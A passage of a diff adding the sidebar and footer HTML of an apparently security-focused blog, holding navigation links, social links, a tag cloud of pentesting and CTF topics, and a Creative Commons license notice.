+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
